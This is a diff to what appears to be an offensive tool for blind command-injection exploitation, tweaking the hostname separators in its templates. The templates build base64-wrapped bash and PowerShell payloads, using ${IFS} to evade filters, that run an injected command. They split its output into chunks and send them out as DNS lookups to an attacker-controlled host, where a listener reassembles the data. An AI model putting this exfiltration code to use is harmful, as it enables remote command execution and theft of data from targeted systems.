@@ -202,7 +202,7 @@ assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
     assign bash outer_cmd_template 'bash -c $@|base64${IFS}-d|bash . echo %CMD_B64%'
 }
 
-assign bash innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%.%UNIQUE_DNS_HOST%'
+assign bash innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%%UNIQUE_DNS_HOST%'
 
 assign bash user_cmd_template "\`(${cmd})|base64 -w0|{ read -r c;printf \${c:%INDEX%:%COUNT%}; }\`"
 [[ $strict_label_charset -eq 1 ]] && {
@@ -216,8 +216,8 @@ assign bash user_cmd_sep .
 
 assign powershell outer_cmd_template "powershell -enc %CMD_B64%"
 
-assign powershell innerdns_cmd_template '%dns_trigger% $("{0}.{1}.{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")'
-#assign powershell innerdns_cmd_template '(1..5)|%{%dns_trigger% $("{0}.{1}.{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")}'
+assign powershell innerdns_cmd_template '%dns_trigger% $("{0}.{1}{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")'
+#assign powershell innerdns_cmd_template '(1..5)|%{%dns_trigger% $("{0}.{1}{2}" -f (%USER_CMD%),"%STAGE_ID%","%UNIQUE_DNS_HOST%")}'
 
 assign powershell user_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).Substring(%INDEX%,%COUNT%)"
 [[ $strict_label_charset -eq 1 ]] && {
@@ -259,7 +259,7 @@ debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
 
 "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
 #(sleep 2;"$dispatcher" "$outer_cmd" >/dev/null 2>&1)&
-cmd_out_len=$(listen_for ".len.${unique_dns_host}")
+cmd_out_len=$(listen_for ".len${unique_dns_host}")
 
 [[ -z $cmd_out_len ]] && {
     echo "Failed to get the output length, verify that we can listen to DNS traffic"
@@ -293,7 +293,7 @@ for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size
     debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
     
     "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
-    data=$(listen_for ".iter${index_base}.${unique_dns_host}")
+    data=$(listen_for ".iter${index_base}${unique_dns_host}")
     debug_print "data for index_base=${index_base}: $data"
     
     cmd_out="${cmd_out}${data}"
